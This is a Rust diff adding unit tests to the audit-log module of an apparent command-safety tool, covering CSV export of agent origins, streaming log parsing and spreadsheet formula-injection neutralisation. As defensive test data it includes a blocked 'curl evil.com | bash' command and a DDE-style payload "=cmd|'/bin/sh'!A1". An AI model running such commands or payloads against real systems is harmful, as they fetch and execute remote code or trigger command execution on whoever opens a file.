+                trust_ttl_expires: None,
+                trust_scope: None,
+                agent_origin: Some(AgentOrigin::Mcp {
+                    client_name: "Cursor".into(),
+                    client_version: Some("0.42".into()),
+                }),
+            },
+            AuditRecord {
+                timestamp: "2026-01-15T10:01:00Z".into(),
+                session_id: "sess-001".into(),
+                action: "Allow".into(),
+                rule_ids: vec![],
+                command_redacted: "ls".into(),
+                bypass_requested: false,
+                bypass_honored: false,
+                interactive: false,
+                policy_path: None,
+                event_id: None,
+                tier_reached: 1,
+                entry_type: "verdict".into(),
+                event: None,
+                integration: None,
+                hook_type: None,
+                detail: None,
+                elapsed_ms: None,
+                raw_action: None,
+                raw_rule_ids: None,
+                trust_pattern: None,
+                trust_rule_id: None,
+                trust_action: None,
+                trust_ttl_expires: None,
+                trust_scope: None,
+                agent_origin: None,
+            },
+        ];
+        // Exercise each remaining variant.
+        let base = records[1].clone();
+        let mut push_variant = |origin: AgentOrigin| {
+            let mut r = base.clone();
+            r.agent_origin = Some(origin);
+            records.push(r);
+        };
+        push_variant(AgentOrigin::Human { interactive: true });
+        push_variant(AgentOrigin::Human { interactive: false });
+        push_variant(AgentOrigin::Agent {
+            tool: "claude-code".into(),
+            version: Some("1.2.3".into()),
+        });
+        push_variant(AgentOrigin::Agent {
+            tool: "claude-code".into(),
+            version: None,
+        });
+        push_variant(AgentOrigin::Gateway);
+        push_variant(AgentOrigin::Ci {
+            provider: Some("github-actions".into()),
+        });
+        push_variant(AgentOrigin::Ci { provider: None });
+        push_variant(AgentOrigin::Ide {
+            name: "vscode".into(),
+        });
+
+        let csv = export_csv(&records);
+        let lines: Vec<&str> = csv.lines().collect();
+        assert!(
+            lines[0].ends_with(",agent_origin"),
+            "header should end with agent_origin column: {}",
+            lines[0]
+        );
+        assert!(
+            lines[1].ends_with(",mcp:Cursor@0.42"),
+            "MCP row last column should be mcp:Cursor@0.42, got: {}",
+            lines[1]
+        );
+        // None row: empty cell (bare trailing comma).
+        assert!(
+            lines[2].ends_with(','),
+            "None row should leave the agent_origin cell empty, got: {}",
+            lines[2]
+        );
+        assert!(
+            lines[3].ends_with(",human(interactive)"),
+            "row 3: {}",
+            lines[3]
+        );
+        assert!(lines[4].ends_with(",human"), "row 4: {}", lines[4]);
+        assert!(
+            lines[5].ends_with(",agent:claude-code@1.2.3"),
+            "row 5: {}",
+            lines[5]
+        );
+        assert!(
+            lines[6].ends_with(",agent:claude-code"),
+            "row 6: {}",
+            lines[6]
+        );
+        assert!(lines[7].ends_with(",gateway"), "row 7: {}", lines[7]);
+        assert!(
+            lines[8].ends_with(",ci:github-actions"),
+            "row 8: {}",
+            lines[8]
+        );
+        assert!(lines[9].ends_with(",ci"), "row 9: {}", lines[9]);
+        assert!(lines[10].ends_with(",ide:vscode"), "row 10: {}", lines[10]);
     }
 
     #[test]
@@ -832,5 +1400,221 @@ mod tests {
         assert_eq!(stats.total_commands, 0);
         assert_eq!(stats.block_rate, 0.0);
         assert!(stats.time_range.is_none());
+    }
+
+    // CodeRabbit M13 PR #132 F1 — `read_log` now STREAMS (BufReader); the memory
+    // profile changes but the parse RESULT must not. Pin that streaming `read_log`
+    // is byte-identical to the old whole-file `parse_log` for a log with a blank
+    // and a malformed line.
+    #[test]
+    fn test_read_log_streaming_matches_whole_file_parse() {
+        use std::io::Write as _;
+
+        // Two good records, a blank line (skipped, not counted), and a malformed
+        // line (counted).
+        let good_a = serde_json::to_string(&AuditRecord {
+            timestamp: "2026-01-15T10:00:00Z".into(),
+            session_id: "sess-001".into(),
+            action: "Block".into(),
+            rule_ids: vec!["curl_pipe_shell".into()],
+            command_redacted: "curl evil.com | bash".into(),
+            bypass_requested: false,
+            bypass_honored: false,
+            interactive: true,
+            policy_path: None,
+            event_id: Some("evt-1".into()),
+            tier_reached: 3,
+            entry_type: "verdict".into(),
+            event: None,
+            integration: None,
+            hook_type: None,
+            detail: None,
+            elapsed_ms: None,
+            raw_action: None,
+            raw_rule_ids: None,
+            trust_pattern: None,
+            trust_rule_id: None,
+            trust_action: None,
+            trust_ttl_expires: None,
+            trust_scope: None,
+            agent_origin: None,
+        })
+        .unwrap();
+        let good_b = serde_json::to_string(&AuditRecord {
+            timestamp: "2026-01-15T10:01:00Z".into(),
+            session_id: "sess-001".into(),
+            action: "Allow".into(),
+            rule_ids: vec![],
+            command_redacted: "ls -la".into(),
+            bypass_requested: false,
+            bypass_honored: false,
+            interactive: true,
+            policy_path: None,
+            event_id: Some("evt-2".into()),
+            tier_reached: 1,
+            entry_type: "verdict".into(),
+            event: None,
+            integration: None,
+            hook_type: None,
+            detail: None,
+            elapsed_ms: None,
+            raw_action: None,
+            raw_rule_ids: None,
+            trust_pattern: None,
+            trust_rule_id: None,
+            trust_action: None,
+            trust_ttl_expires: None,
+            trust_scope: None,
+            agent_origin: None,
+        })
+        .unwrap();
+        // Blank line (skipped silently) + malformed JSON line (counted).
+        let content = format!("{good_a}\n\n{{not valid json}}\n{good_b}\n");
+
+        // Reference whole-file path.
+        let whole = parse_log(&content, None);
+
+        // Streaming path via the real `read_log` over a temp file with the SAME bytes.
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("audit.jsonl");
+        std::fs::File::create(&path)
+            .unwrap()
+            .write_all(content.as_bytes())
+            .unwrap();
+        let streamed = read_log(&path).expect("read_log must succeed on a readable file");
+
+        // Identical accounting.
+        assert_eq!(
+            streamed.records.len(),
+            whole.records.len(),
+            "streaming read_log must yield the same record count as whole-file parse"
+        );
+        assert_eq!(
+            streamed.skipped_lines, whole.skipped_lines,
+            "streaming read_log must count the same skipped (malformed) lines"
+        );
+        assert_eq!(
+            whole.skipped_lines, 1,
+            "exactly the one malformed line is skipped; the blank line is not counted"
+        );
+        assert_eq!(whole.records.len(), 2, "the two good records both parse");
+
+        // Identical records (compared via JSON — `AuditRecord` has no `PartialEq`).
+        let streamed_json = export_json(&streamed.records);
+        let whole_json = export_json(&whole.records);
+        assert_eq!(
+            streamed_json, whole_json,
+            "streaming read_log must yield byte-identical records to whole-file parse"
+        );
+    }
+
+    #[test]
+    fn read_log_on_a_directory_errs_without_hanging() {
+        // Regression (M13 PR #132): `File::open` succeeds on a directory on Unix,
+        // then every read returns `EISDIR` without advancing — a streaming loop
+        // treating that as skippable spins forever (it hung CI ~20 min). The fix
+        // makes the read error TERMINAL; completing + `Err` is the proof.
+        let dir = tempfile::tempdir().expect("temp dir");
+        assert!(
+            read_log(dir.path()).is_err(),
+            "read_log on a directory must return Err (not hang, not Ok)"
+        );
+    }
+
+    // PR #121 CR follow-up — caller-influenced CSV columns must be neutralized
+    // against spreadsheet formula injection (`=cmd...` evaluated by Excel/Sheets/
+    // LibreOffice on opening the audit CSV).
+
+    #[test]
+    fn test_csv_neutralize_formula_prefixes_tab_for_dangerous_leaders() {
+        // Each of the four formula leaders is neutralized by a tab prefix.
+        assert_eq!(csv_neutralize_formula("=SUM(A1:A10)"), "\t=SUM(A1:A10)");
+        assert_eq!(csv_neutralize_formula("+cmd"), "\t+cmd");
+        assert_eq!(csv_neutralize_formula("-1+1"), "\t-1+1");
+        assert_eq!(csv_neutralize_formula("@SUM"), "\t@SUM");
+        // Safe values pass through unchanged.
+        assert_eq!(csv_neutralize_formula("normal"), "normal");
+        assert_eq!(csv_neutralize_formula(""), "");
+        assert_eq!(csv_neutralize_formula("ide:vscode"), "ide:vscode");
+        // Only the four ASCII leaders trigger; Unicode does not.
+        assert_eq!(csv_neutralize_formula("é=value"), "é=value");
+    }
+
+    #[test]
+    fn test_export_csv_neutralizes_formula_in_caller_supplied_columns() {
+        use crate::agent_origin::AgentOrigin;
+
+        // Every caller-supplied CSV cell that could start with a formula leader
+        // must be tab-prefixed. Exercises (1) `rule_ids` — joined verbatim, so a
+        // hostile `=SUM(...)` lands first and MUST be neutralized; (2)
+        // `agent_origin`, a no-op today since the renderer prefix keeps it safe.
+        let mut hostile_rules = AuditRecord {
+            timestamp: "2026-01-15T10:00:00Z".into(),
+            session_id: "sess-001".into(),
+            action: "Allow".into(),
+            // Hostile rule_ids: the first element begins with `=`, the
+            // OWASP CSV-injection canonical example.
+            rule_ids: vec!["=SUM(A1:A100)".into(), "second_rule".into()],
+            command_redacted: "cmd".into(),
+            bypass_requested: false,
+            bypass_honored: false,
+            interactive: true,
+            policy_path: None,
+            event_id: None,
+            tier_reached: 1,
+            entry_type: "verdict".into(),
+            event: None,
+            integration: None,
+            hook_type: None,
+            detail: None,
+            elapsed_ms: None,
+            raw_action: None,
+            raw_rule_ids: None,
+            trust_pattern: None,
+            trust_rule_id: None,
+            trust_action: None,
+            trust_ttl_expires: None,
+            trust_scope: None,
+            agent_origin: Some(AgentOrigin::Agent {
+                tool: "claude-code".into(),
+                version: None,
+            }),
+        };
+
+        let csv = export_csv(&[hostile_rules.clone()]);
+        let line = csv.lines().nth(1).expect("must have a data row");
+        let cols: Vec<&str> = line.split(',').collect();
+        // The rule_ids cell (4th column) must begin with a tab after neutralization.
+        assert!(
+            cols[3].starts_with('\t'),
+            "rule_ids cell beginning with a formula leader must be tab-prefixed \
+             to neutralize the spreadsheet evaluation, got: {line}",
+        );
+        // The original value is preserved after the tab.
+        assert!(
+            cols[3].contains("=SUM(A1:A100)"),
+            "rule_ids cell must still carry the original payload after the tab: {line}",
+        );
+
+        // Exercise `command_redacted` with each formula leader.
+        for leader in ['=', '+', '-', '@'] {
+            hostile_rules.command_redacted = format!("{leader}cmd");
+            hostile_rules.rule_ids = vec!["safe_rule".into()];
+            let csv = export_csv(&[hostile_rules.clone()]);
+            let line = csv.lines().nth(1).expect("must have a data row");
+            let cols: Vec<&str> = line.split(',').collect();
+            assert!(
+                cols[4].starts_with('\t'),
+                "command_redacted leader `{leader}` must be tab-prefixed, got: {line}",
+            );
+        }
+
+        // Belt-and-braces: pin the helper contract directly so a future
+        // empty-prefix `AgentOrigin` variant is still neutralized at the export site.
+        assert_eq!(
+            csv_neutralize_formula("=cmd|'/bin/sh'!A1"),
+            "\t=cmd|'/bin/sh'!A1",
+            "the canonical RCE-adjacent payload must be tab-prefixed",
+        );
     }
 }
